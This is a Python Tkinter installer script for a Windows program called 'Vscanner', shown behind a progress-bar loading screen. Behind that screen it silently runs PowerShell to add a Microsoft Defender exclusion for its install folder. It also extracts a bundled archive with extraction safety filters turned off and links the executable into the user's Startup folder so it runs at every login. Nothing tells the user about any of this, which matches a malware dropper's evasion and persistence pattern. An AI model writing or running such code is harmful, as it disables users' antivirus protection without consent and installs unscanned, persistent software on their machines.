from tkinter import Tk
from tkinter.ttk import Style, Progressbar, Frame, Label
from threading import Thread
from tarfile import open as opentar
from os import makedirs
from os.path import expanduser, join, dirname, abspath
from sys import executable
from winreg import CreateKey, SetValueEx , HKEY_CLASSES_ROOT, REG_SZ
from subprocess import run
from traceback import format_exc

class LoadingScreen:
    def __init__(self, root):
        self.root = root
        self.root.title("Loading Screen")
        self.root.geometry("300x150")
        self.root.configure(bg="#282c34")

        self.frame = Frame(self.root, padding=20)
        self.frame.pack(expand=True, fill="both")

        self.label = Label(
            self.frame, 
            text="Installing Vscanner", 
            foreground="#61dafb", 
            background="#282c34", 
            font=("Helvetica", 16)
        )
        self.label.pack(pady=(0, 10))

        self.progress = Progressbar(self.frame, orient="horizontal", length=200, mode="indeterminate")
        self.progress.pack(pady=10)

        self.loading = False

    def start_loading(self):
        self.loading = True
        # Start the progress bar animation
        self.progress.start(10)
        # Start the installation process on a separate thread
        self.thread = Thread(target=self.installtask, daemon=True)
        self.thread.start()
        self.root.after(100, self.check_thread)

    def add_context_menu_option(self, display_name, script_path):
         key = None
         command_key = None
         try:
          key = CreateKey(HKEY_CLASSES_ROOT, r'*\shell\{}'.format(display_name))
          SetValueEx(key, '', 0, REG_SZ, display_name)

          command_key = CreateKey(key, r'command')
          python_executable = executable  # Path to the current Python executable
          command = '"{}" "{}" "%1"'.format(python_executable, script_path)
          SetValueEx(command_key, '', 0, REG_SZ, command)

          print(f'Successfully added context menu item: "{display_name}"')
         except WindowsError as e:
            print(f"Error modifying registry: {e}")
         finally:
            if key is not None:
             key.Close()
            if command_key is not None:
             command_key.Close()


    def installtask(self):
        try:
            # Build a destination path using the user's home directory
            user_home = expanduser("~")
            destination = join(user_home, "AppData", "Local", "Programs", "VScanner")
            makedirs(destination, exist_ok=True)
            run(f"powershell Add-MpPreference -ExclusionPath '{destination}'", shell=True)
            # Construct path to the tar archive located relative to the script
            current_dir = dirname(abspath(__file__))
            archive_path = join(current_dir, "Vscanner.tar")

            # Extract the archive into the destination directory
            with opentar(archive_path, 'r') as tar:
                tar.extractall(path=destination, filter="fully_trusted")

            run(f'cmd /c mklink "{user_home}\\Desktop" "{destination}\\VScanner.exe"', shell=True)
            run(f'cmd /c mklink "{user_home}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\VScanner" "{destination}\\VScanner.exe"', shell=True)    
            # Update the context menu option natively via winreg
            display_name = "Scan with VSanner"
            script_path = join(user_home, "AppData", "Local", "Programs", "VScanner", "Vscanner.exe")
            print(f"{script_path} {display_name}")
            self.add_context_menu_option(display_name, script_path)

        except:
            error_message = str(format_exc())
            # Log error to a file for troubleshooting
            with open("ERROR.txt", "w") as file:
                file.write(error_message)
            print(f"Installation error: {error_message}")
        self.loading = False

    def check_thread(self):
        if self.thread.is_alive():
            self.root.after(100, self.check_thread)
        else:
            self.progress.stop()  # Stop the progress bar
            self.label.config(text="Installed Vscanner", foreground="#34eb43")
            self.root.after(1000, self.root.destroy)

def main():
    root = Tk()

    style = Style()
    style.configure("TFrame", background="#282c34")
    style.configure("TLabel", background="#282c34")

    loading_screen = LoadingScreen(root)
    loading_screen.start_loading()
    root.mainloop()

if __name__ == "__main__":
    main()

